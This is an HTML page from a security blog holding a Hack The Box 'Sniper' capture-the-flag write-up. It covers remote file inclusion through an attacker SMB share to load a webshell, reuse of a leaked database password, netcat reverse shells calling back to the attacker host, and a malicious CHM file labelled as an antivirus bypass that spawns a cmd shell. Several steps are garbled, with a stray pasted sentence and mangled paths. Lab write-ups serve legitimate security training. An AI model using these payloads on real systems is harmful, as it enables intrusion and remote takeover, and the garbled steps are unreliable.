@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>
+
+<meta charset="utf-8">
+<meta name="generator" content="quarto-1.7.32">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+
+<meta name="author" content="0xPThree">
+<meta name="dcterms.date" content="2019-11-20">
+<meta name="description" content="Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.">
+
+<title>Sniper - Hack The Box – Exploit.se</title>
+<style>
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+ul.task-list{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+  width: 0.8em;
+  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
+  vertical-align: middle;
+}
+</style>
+
+
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../../">
+<link href="../../favicon.ico" rel="icon">
+<script src="../../site_libs/quarto-html/quarto.js" type="module"></script>
+<script src="../../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../../site_libs/quarto-html/quarto-syntax-highlighting-37eea08aefeeee20ff55810ff984fec1.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap-a98ec624fb63d9b712fc3a6f62e2b305.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
+<script id="quarto-search-options" type="application/json">{
+  "location": "navbar",
+  "copy-button": false,
+  "collapse-after": 3,
+  "panel-placement": "end",
+  "type": "overlay",
+  "limit": 50,
+  "keyboard-shortcut": [
+    "f",
+    "/",
+    "s"
+  ],
+  "show-item-context": false,
+  "language": {
+    "search-no-results-text": "No results",
+    "search-matching-documents-text": "matching documents",
+    "search-copy-link-title": "Copy link to search",
+    "search-hide-matches-text": "Hide additional matches",
+    "search-more-match-text": "more match in this document",
+    "search-more-matches-text": "more matches in this document",
+    "search-clear-button-title": "Clear",
+    "search-text-placeholder": "",
+    "search-detached-cancel-button-title": "Cancel",
+    "search-submit-button-title": "Submit",
+    "search-label": "Search"
+  }
+}</script>
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>
+
+<script type="text/javascript">
+
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
+</script>
+
+  <script src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml-full.js" type="text/javascript"></script>
+
+<script type="text/javascript">
+const typesetMath = (el) => {
+  if (window.MathJax) {
+    // MathJax Typeset
+    window.MathJax.typeset([el]);
+  } else if (window.katex) {
+    // KaTeX Render
+    var mathElements = el.getElementsByClassName("math");
+    var macros = [];
+    for (var i = 0; i < mathElements.length; i++) {
+      var texText = mathElements[i].firstChild;
+      if (mathElements[i].tagName == "SPAN") {
+        window.katex.render(texText.data, mathElements[i], {
+          displayMode: mathElements[i].classList.contains('display'),
+          throwOnError: false,
+          macros: macros,
+          fleqn: false
+        });
+      }
+    }
+  }
+}
+window.Quarto = {
+  typesetMath
+};
+</script>
+
+<link rel="stylesheet" href="../../scss/styles.css">
+<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
+<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
+<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
+</head>
+
+<body class="nav-fixed quarto-light">
+
+<div id="quarto-search-results"></div>
+  <header id="quarto-header" class="headroom fixed-top quarto-banner">
+    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
+      <div class="navbar-container container-fluid">
+      <div class="navbar-brand-container mx-auto">
+    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
+    <img src="../../static/exploit_white-orange.png" alt="" class="navbar-logo">
+    </a>
+  </div>
+            <div id="quarto-search" class="" title="Search"></div>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+  <span class="navbar-toggler-icon"></span>
+</button>
+          <div class="collapse navbar-collapse" id="navbarCollapse">
+            <ul class="navbar-nav navbar-nav-scroll ms-auto">
+  <li class="nav-item">
+    <a class="nav-link" href="../../writeups.html"> 
+<span class="menu-text">Writeups</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
+<span class="menu-text">Notes</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../about.html"> 
+<span class="menu-text">About</span></a>
+  </li>  
+</ul>
+          </div> <!-- /navcollapse -->
+            <div class="quarto-navbar-tools">
+</div>
+      </div> <!-- /container-fluid -->
+    </nav>
+</header>
+<!-- content -->
+<header id="title-block-header" class="quarto-title-block default page-columns page-full">
+  <div class="quarto-title-banner page-columns page-full">
+    <div class="quarto-title column-body">
+      <h1 class="title">Sniper - Hack The Box</h1>
+                  <div>
+        <div class="description">
+          Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.
+        </div>
+      </div>
+                          <div class="quarto-categories">
+                <div class="quarto-category">hackthebox</div>
+              </div>
+                  </div>
+  </div>
+    
+  
+  <div class="quarto-title-meta">
+
+      <div>
+      <div class="quarto-title-meta-heading">Author</div>
+      <div class="quarto-title-meta-contents">
+               <p>0xPThree </p>
+            </div>
+    </div>
+      
+      <div>
+      <div class="quarto-title-meta-heading">Published</div>
+      <div class="quarto-title-meta-contents">
+        <p class="date">November 20, 2019</p>
+      </div>
+    </div>
+    
+      
+    </div>
+    
+  
+  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
+<!-- sidebar -->
+<!-- margin-sidebar -->
+    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar zindex-bottom">
+        
+    </div>
+<!-- main -->
+<main class="content quarto-banner-title-block" id="quarto-document-content">
+
+
+
+
+
+<p><img src="images/sniper_logo.png" class="img-fluid"></p>
+<p>“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”</p>
+<hr>
+<p>██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝</p>
+<ol type="1">
+<li><p>nmap -Pn -sC -sV -n -O sniper.htb PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Sniper Co. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+<p>Host script results: |<em>clock-skew: 7h00m12s | smb2-security-mode: | 2.02: |</em> Message signing enabled but not required | smb2-time: | date: 2019-11-20T16:04:55 |_ start_date: N/A</p></li>
+</ol>
+<p>nmap -Pn -sV -n -p- sniper.htb PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windowhis netbios-ssn 445/tcp open microsoft-ds? 49667/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+<ol start="2" type="1">
+<li><p>Enumeration with dirb and nikto finds.. .. Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST</p></li>
+<li><p>Continue enumeration by browsing the website and we find http://sniper.htb/blog/?lang=blog-en.php ?lang=xxx looks like it could be vulnerable by RFI. Reading up on RFI a common way is to setup a local SMB share and fetch a webshell - lets try that!</p>
+<p>root@p3:~# vi /etc/samba/smb.conf</p>
+<p>[pub-share] Comment = SMB Drops path = /srv/pub-share writable = yes guest ok = yes read only = no force user = nobody</p>
+<p>root@p3:~# service smbd restart</p>
+<p>Make sure that the share is reachable: root@p3:/srv/pub-share# smbclient //10.10.14.10/pub-share Enter WORKGROUP’s password: Try “help” to get a list of possible commands. smb: &gt; ls . D 0 Fri Nov 22 11:57:22 2019 .. D 0 Fri Nov 22 10:57:42 2019 sniper-rev.php N 94 Fri Nov 22 09:50:24 2019 nc64.exe N 45272 Wed Nov 20 15:16:38 2019 webshell.php N 7206 Fri Nov 22 11:00:15 2019</p>
+<pre><code>     554197528 blocks of size 1024. 501299668 blocks available</code></pre></li>
+<li><p>Execute RFI and connect to webshell.php for Initial Foothold. http://sniper.htb/blog/?lang=//10.10.14.10/pub-share/webshell.php whoami nt authority</p></li>
+<li><p>Poking around in the box we find db.php (C:) type db.php <!--?php
+   // Enter your Host, username, password, database below.
+   // I left password empty because i do not set password on localhost.
+   $con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
+   // Check connection
+   if (mysqli_connect_errno())
+   {
+   echo "Failed to connect to MySQL: " . mysqli_connect_error();
+   }
+   ?--></p>
+<p>Our first pair of creds - dbuser:36mEAhz/B8xQ~2VM for MYSQL database sniper</p></li>
+<li><p>Looking for users we find 2 accounts, Administrator and Chris. However we don’t have permissions to enter any of them. dir Directory of C:/11/2019 06:04 AM</p>
+<dir>
+<p>. 04/11/2019 06:04 AM</p>
+<dir>
+<p>.. 04/09/2019 05:47 AM</p>
+<dir>
+<p>Administrator 04/11/2019 06:04 AM</p>
+<dir>
+<p>Chris 04/09/2019 05:47 AM</p>
+<dir>
+<p>Public 0 File(s) 0 bytes 5 Dir(s) 17,963,245,568 bytes free</p></dir></dir></dir></dir></dir></li>
+<li><p>Verify the account using rpcclient root@p3:/opt/shells# rpcclient -U chris sniper.htb Enter WORKGROUP’s password: (36mEAhz/B8xQ~2VM) rpcclient $&gt;</p>
+<p>NOTE: Looks like Chris is re-using his password. Working creds - Chris:36mEAhz/B8xQ~2VM</p></li>
+<li><p>Spawn an interactive reverse powershell from your webshell by calling netcat for windows. Download netcat 1.12: https://eternallybored.org/misc/netcat/</p>
+<p>root@p3:/opt/htb/machines/sniper# unzip netcat-win32-1.12.zip /nc64 root@p3:/opt/htb/machines/sniper# cp nc64/nc64.exe /srv/pub-share root@p3:/opt/htb/machines/sniper# chmod +x /srv/pub-share/nc64.exe</p>
+<p>From Webshell: //10.10.14.10/pub-share/nc64.exe 10.10.14.10 4488 -e powershell</p>
+<p>root@p3:/opt/htb/machines/sniper# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.151] 49908 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.</p>
+<p>PS C:&gt; whoami whoami nt authority PS C:&gt; $env:computername $env:computername SNIPER</p></li>
+<li><p>Change user from iusr to Chris by setting up another reverse shell, using the found creds.</p>
+<p>Assign the credentials: PS C:&gt; $user = ‘sniper.htb’ PS C:&gt; $pass = ‘36mEAhz/B8xQ~2VM’ | ConvertTo-SecureString -AsPlainText -Force PS C:&gt; <span class="math inline">\(creds = New-Object System.Management.Automation.PSCredential(\)</span>user,$pass)</p>
+<p>Test to make sure it works by sending single command to the “remote” host: PS C:&gt; Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { whoami } sniper</p>
+<p>Setup a new reverse shell as Chris: PS C:&gt; Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { //10.10.14.10/pub-share/nc64.exe 10.10.14.10 4499 -e powershell }</p>
+<p>root@p3:/opt/htb/machines/sniper# nc -lvnp 4499 listening on [any] 4499 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.151] 50014 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.</p>
+<p>PS C:&gt; whoami whoami sniper</p></li>
+<li><p>Grab user.txt PS C:&gt; type user.txt type user.txt 21f4****************************</p></li>
+</ol>
+<p>██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████</p>
+<p>██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝</p>
+<ol type="1">
+<li><p>Looking around in the box we find a file named instructions.chm in C:. Lets download it and view the file.</p>
+<p>PS C:&gt; Copy-Item -Path instructions.chm -Destination //10.10.14.10/pub-share/instructions.chm root@p3:/srv/pub-share# mv instructions.chm /opt/htb/machines/sniper/ root@p3:/opt/htb/machines/sniper# xchm instructions.chm</p>
+<blockquote class="blockquote">
+<p>Sniper Android App Documentation Table of Contents Pff… This dumb CEO always makes me do all the shitty work. SMH! I’m never completing this thing. Gonna leave this place next week. Hope someone snipes him.</p>
+</blockquote></li>
+</ol>
+<p>Maybe we are looking for an app for privesc?</p>
+<ol start="2" type="1">
+<li><p>In C:we find note.txt and “php for dummies-trial.pdf”, lets view them.</p>
+<p>PS C:&gt; type note.txt Hi Chris, Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you’ve prepared the documentation for our new app. Drop it here when you’re done with it. Regards, Sniper CEO.</p>
+<p>PS C:&gt; Copy-Item -Path “php for dummies-trial.pdf”-Destination //10.10.14.10/pub-share/test.pdf root@p3:/srv/pub-share# mv test.pdf /opt/htb/machines/sniper/php-dummies.pdf</p>
+<p>The PDF only contains table of content, and no actual content.</p></li>
+<li><p>CHM-files are deemed as dangerous as they can be injected with malicious code. We can compile our own (malicious) .chm-file using only Windows tools (HTML Help). Let’s start by creating the three files needed; .htm, .hhc and .hhp</p>
+<p>.htm - this is our payload where we inject the malicious data .hhc - contains the Table of Content for the HTML Help file .hhp - our project file used to bind all the other files together</p>
+<p>root@p3:/opt/htb/machines/sniper# cat expl.htm</p>
+
+
+<title>
+&lt;p&gt;Bypass AV by PlayerThree&lt;/p&gt;
+</title>
+
+
+<p><object id="x" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width="1" height="1"> <param name="Command" value="ShortCut"> <param name="Button" value="Bitmap::shortcut"> <param name="Item1" value=",cmd.exe,/c c:\docs\nc64.exe 10.10.14.10 4400 -e c:\windows\system32\cmd.exe"> <param name="Item2" value="273,1,1"> </object></p>
+<script>
+   x.Click();
+ </script>
+<h1>
+<p>Bypass AV by PlayerThree</p>
+</h1>
+
+
+<p>root@p3:/opt/htb/machines/sniper# cat expl.hhc &lt;!DOCTYPE HTML PUBLIC “-//IETF//DTD HTML//EN”&gt;</p>
+
+
+<meta name="GENERATOR" content="Microsoft® HTML Help Workshop 4.1">
+<!-- Sitemap 1.0 -->
+
+
+<object type="text/site properties">
+<p><param name="ImageType" value="Folder"></p>
+</object>
+<ul>
+<li>
+<object type="text/sitemap">
+<p><param name="Name" value="AV Bypass by PlayerThree"> <param name="Local" value="expl.htm
+         "></p>
+</object>
+</li></ul>
+
+
+<p>root@p3:/opt/htb/machines/sniper# cat expl.hhp [OPTIONS] Compatibility=1.1 or later Compiled file=expl.chm Contents file=expl.hhc Default topic=expl.htm Display compile progress=No Language=0x409 English (United States)</p>
+<p>[FILES] C:.htm</p></li>
+<li><p>When all files are created we need to switch over to a Windows-box and compile it ’m in with chris shell. I guess I have to explote this vulnerability “Microsoft Compiled HTML Help / Uncompiled .chm File - XML External Entity Injection”, but i don’t get success with my .chm file, i’m in the right placdo the .chm-file. C:&gt; “C:Files (x86)Help Workshop.exe” expl.hpp Microsoft HTML Help Compiler 4.74.8702</p>
+<p>Compiling C:.chm</p>
+<p>Compile time: 0 minutes, 1 second 1 Topics 0 Local links 0 Internet links 0 Graphics</p>
+<p>Created C:.chm, 10835 bytes Compression decreased file by 10835 bytes.</p></li>
+<li><p>Upload our malicious chm-file to sniper.htb c:, as hinted in note.txt (Drop it here when you’re done with it.), and quickly run the file to execute the payload. Grab root.txt. PS C:&gt; copy //10.10.14.10/pub-share/nc64.exe nc64.exe PS C:&gt; copy //10.10.14.10/pub-share/expl.chm expl.chm PS C:&gt; ..chm</p>
+<p>root@p3:/opt/htb/machines/sniper# nc -lvnp 4400 listening on [any] 4400 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.151] 49681 Microsoft Windows [Version 10.0.17763.678]</p>
+<ol start="3" type="a">
+<li>2018 Microsoft Corporation. All rights reserved.</li>
+</ol>
+<p>C:&gt;whoami sniper C:&gt;type root.txt 5624****************************</p></li>
+</ol>
+<p>██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████</p>
+<p>██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝</p>
+<p>RFI + SMB https://medium.com/<span class="citation" data-cites="minimalist.ascent/remote-file-include-using-samba-shares-6fa76dfeb4ce">@minimalist.ascent/remote-file-include-using-samba-shares-6fa76dfeb4ce</span> http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</p>
+<p>nc64.exe https://www.youtube.com/watch?v=PJXb2pK8K84&amp;t=1155 (found by searching for ‘windows reverse’ on https://ippsec.rocks/)</p>
+<p>Change user https://social.technet.microsoft.com/Forums/lync/en-US/e8452304-06db-45ab-961e-2c4ef3fa2a12/enter-username-and-password-using-powershell?forum=winserverpowershell https://www.howtogeek.com/117192/how-to-run-powershell-commands-on-remote-computers/</p>
+<p>Good random commands powershell -ep bypass runas /user:snipercmd.exe</p>
+<p>Malicious .chm-file https://github.com/arntsonl/calc_security_poc/tree/master/chm https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7</p>
+
+
+
+</main> <!-- /main -->
+<script id="quarto-html-after-body" type="application/javascript">
+  window.document.addEventListener("DOMContentLoaded", function (event) {
+    const icon = "";
+    const anchorJS = new window.AnchorJS();
+    anchorJS.options = {
+      placement: 'right',
+      icon: icon
+    };
+    anchorJS.add('.anchored');
+    const isCodeAnnotation = (el) => {
+      for (const clz of el.classList) {
+        if (clz.startsWith('code-annotation-')) {                     
+          return true;
+        }
+      }
+      return false;
+    }
+    const onCopySuccess = function(e) {
+      // button target
+      const button = e.trigger;
+      // don't keep focus
+      button.blur();
+      // flash "checked"
+      button.classList.add('code-copy-button-checked');
+      var currentTitle = button.getAttribute("title");
+      button.setAttribute("title", "Copied!");
+      let tooltip;
+      if (window.bootstrap) {
+        button.setAttribute("data-bs-toggle", "tooltip");
+        button.setAttribute("data-bs-placement", "left");
+        button.setAttribute("data-bs-title", "Copied!");
+        tooltip = new bootstrap.Tooltip(button, 
+          { trigger: "manual", 
+            customClass: "code-copy-button-tooltip",
+            offset: [0, -8]});
+        tooltip.show();    
+      }
+      setTimeout(function() {
+        if (tooltip) {
+          tooltip.hide();
+          button.removeAttribute("data-bs-title");
+          button.removeAttribute("data-bs-toggle");
+          button.removeAttribute("data-bs-placement");
+        }
+        button.setAttribute("title", currentTitle);
+        button.classList.remove('code-copy-button-checked');
+      }, 1000);
+      // clear code selection
+      e.clearSelection();
+    }
+    const getTextToCopy = function(trigger) {
+        const codeEl = trigger.previousElementSibling.cloneNode(true);
+        for (const childEl of codeEl.children) {
+          if (isCodeAnnotation(childEl)) {
+            childEl.remove();
+          }
+        }
+        return codeEl.innerText;
+    }
+    const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
+      text: getTextToCopy
+    });
+    clipboard.on('success', onCopySuccess);
+    if (window.document.getElementById('quarto-embedded-source-code-modal')) {
+      const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
+        text: getTextToCopy,
+        container: window.document.getElementById('quarto-embedded-source-code-modal')
+      });
+      clipboardModal.on('success', onCopySuccess);
+    }
+      var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
+      var mailtoRegex = new RegExp(/^mailto:/);
+        var filterRegex = new RegExp("https:\/\/exploit\.se");
+      var isInternal = (href) => {
+          return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
+      }
+      // Inspect non-navigation links and adorn them if external
+     var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
+      for (var i=0; i<links.length; i++) {
+        const link = links[i];
+        if (!isInternal(link.href)) {
+          // undo the damage that might have been done by quarto-nav.js in the case of
+          // links that we want to consider external
+          if (link.dataset.originalHref !== undefined) {
+            link.href = link.dataset.originalHref;
+          }
+        }
+      }
+    function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
+      const config = {
+        allowHTML: true,
+        maxWidth: 500,
+        delay: 100,
+        arrow: false,
+        appendTo: function(el) {
+            return el.parentElement;
+        },
+        interactive: true,
+        interactiveBorder: 10,
+        theme: 'quarto',
+        placement: 'bottom-start',
+      };
+      if (contentFn) {
+        config.content = contentFn;
+      }
+      if (onTriggerFn) {
+        config.onTrigger = onTriggerFn;
+      }
+      if (onUntriggerFn) {
+        config.onUntrigger = onUntriggerFn;
+      }
+      window.tippy(el, config); 
+    }
+    const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
+    for (var i=0; i<noterefs.length; i++) {
+      const ref = noterefs[i];
+      tippyHover(ref, function() {
+        // use id or data attribute instead here
+        let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
+        try { href = new URL(href).hash; } catch {}
+        const id = href.replace(/^#\/?/, "");
+        const note = window.document.getElementById(id);
+        if (note) {
+          return note.innerHTML;
+        } else {
+          return "";
+        }
+      });
+    }
+    const xrefs = window.document.querySelectorAll('a.quarto-xref');
+    const processXRef = (id, note) => {
+      // Strip column container classes
+      const stripColumnClz = (el) => {
+        el.classList.remove("page-full", "page-columns");
+        if (el.children) {
+          for (const child of el.children) {
+            stripColumnClz(child);
+          }
+        }
+      }
+      stripColumnClz(note)
+      if (id === null || id.startsWith('sec-')) {
+        // Special case sections, only their first couple elements
+        const container = document.createElement("div");
+        if (note.children && note.children.length > 2) {
+          container.appendChild(note.children[0].cloneNode(true));
+          for (let i = 1; i < note.children.length; i++) {
+            const child = note.children[i];
+            if (child.tagName === "P" && child.innerText === "") {
+              continue;
+            } else {
+              container.appendChild(child.cloneNode(true));
+              break;
+            }
+          }
+          if (window.Quarto?.typesetMath) {
+            window.Quarto.typesetMath(container);
+          }
+          return container.innerHTML
+        } else {
+          if (window.Quarto?.typesetMath) {
+            window.Quarto.typesetMath(note);
+          }
+          return note.innerHTML;
+        }
+      } else {
+        // Remove any anchor links if they are present
+        const anchorLink = note.querySelector('a.anchorjs-link');
+        if (anchorLink) {
+          anchorLink.remove();
+        }
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(note);
+        }
+        if (note.classList.contains("callout")) {
+          return note.outerHTML;
+        } else {
+          return note.innerHTML;
+        }
+      }
+    }
+    for (var i=0; i<xrefs.length; i++) {
+      const xref = xrefs[i];
+      tippyHover(xref, undefined, function(instance) {
+        instance.disable();
+        let url = xref.getAttribute('href');
+        let hash = undefined; 
+        if (url.startsWith('#')) {
+          hash = url;
+        } else {
+          try { hash = new URL(url).hash; } catch {}
+        }
+        if (hash) {
+          const id = hash.replace(/^#\/?/, "");
+          const note = window.document.getElementById(id);
+          if (note !== null) {
+            try {
+              const html = processXRef(id, note.cloneNode(true));
+              instance.setContent(html);
+            } finally {
+              instance.enable();
+              instance.show();
+            }
+          } else {
+            // See if we can fetch this
+            fetch(url.split('#')[0])
+            .then(res => res.text())
+            .then(html => {
+              const parser = new DOMParser();
+              const htmlDoc = parser.parseFromString(html, "text/html");
+              const note = htmlDoc.getElementById(id);
+              if (note !== null) {
+                const html = processXRef(id, note);
+                instance.setContent(html);
+              } 
+            }).finally(() => {
+              instance.enable();
+              instance.show();
+            });
+          }
+        } else {
+          // See if we can fetch a full url (with no hash to target)
+          // This is a special case and we should probably do some content thinning / targeting
+          fetch(url)
+          .then(res => res.text())
+          .then(html => {
+            const parser = new DOMParser();
+            const htmlDoc = parser.parseFromString(html, "text/html");
+            const note = htmlDoc.querySelector('main.content');
+            if (note !== null) {
+              // This should only happen for chapter cross references
+              // (since there is no id in the URL)
+              // remove the first header
+              if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
+                note.children[0].remove();
+              }
+              const html = processXRef(null, note);
+              instance.setContent(html);
+            } 
+          }).finally(() => {
+            instance.enable();
+            instance.show();
+          });
+        }
+      }, function(instance) {
+      });
+    }
+        let selectedAnnoteEl;
+        const selectorForAnnotation = ( cell, annotation) => {
+          let cellAttr = 'data-code-cell="' + cell + '"';
+          let lineAttr = 'data-code-annotation="' +  annotation + '"';
+          const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
+          return selector;
+        }
+        const selectCodeLines = (annoteEl) => {
+          const doc = window.document;
+          const targetCell = annoteEl.getAttribute("data-target-cell");
+          const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
+          const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
+          const lines = annoteSpan.getAttribute("data-code-lines").split(",");
+          const lineIds = lines.map((line) => {
+            return targetCell + "-" + line;
+          })
+          let top = null;
+          let height = null;
+          let parent = null;
+          if (lineIds.length > 0) {
+              //compute the position of the single el (top and bottom and make a div)
+              const el = window.document.getElementById(lineIds[0]);
+              top = el.offsetTop;
+              height = el.offsetHeight;
+              parent = el.parentElement.parentElement;
+            if (lineIds.length > 1) {
+              const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
+              const bottom = lastEl.offsetTop + lastEl.offsetHeight;
+              height = bottom - top;
+            }
+            if (top !== null && height !== null && parent !== null) {
+              // cook up a div (if necessary) and position it 
+              let div = window.document.getElementById("code-annotation-line-highlight");
+              if (div === null) {
+                div = window.document.createElement("div");
+                div.setAttribute("id", "code-annotation-line-highlight");
+                div.style.position = 'absolute';
+                parent.appendChild(div);
+              }
+              div.style.top = top - 2 + "px";
+              div.style.height = height + 4 + "px";
+              div.style.left = 0;
+              let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
+              if (gutterDiv === null) {
+                gutterDiv = window.document.createElement("div");
+                gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
+                gutterDiv.style.position = 'absolute';
+                const codeCell = window.document.getElementById(targetCell);
+                const gutter = codeCell.querySelector('.code-annotation-gutter');
+                gutter.appendChild(gutterDiv);
+              }
+              gutterDiv.style.top = top - 2 + "px";
+              gutterDiv.style.height = height + 4 + "px";
+            }
+            selectedAnnoteEl = annoteEl;
+          }
+        };
+        const unselectCodeLines = () => {
